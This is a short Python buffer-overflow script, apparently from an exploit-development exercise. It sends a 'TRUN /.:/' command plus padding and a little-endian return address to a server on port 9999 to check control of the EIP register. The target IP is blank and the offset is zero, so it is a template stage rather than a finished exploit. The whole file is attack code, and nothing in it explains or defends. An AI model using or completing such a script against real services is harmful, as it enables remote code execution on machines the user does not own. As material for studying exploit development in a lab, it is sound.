#!/usr/bin/python3
import sys
import socket

target_ip = ""
target_port = 9999
cmd_attacking = 'TRUN /.:/'
offset = 0
shellcode = b"A" * offset + b"\xaf\x11\x50\x62"
print("-" * 100)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    payload = bytes(cmd_attacking, encoding='utf-8') + shellcode
    print(f"\nPayload sent with a offset of {offset} bytes. "
          f"\nEIP should match the address for the correct module.\n")
    s.send(payload)
    s.close()
    print("-" * 100)
except:
    print("Error connecting to server")
    print("-" * 100)
    sys.exit()

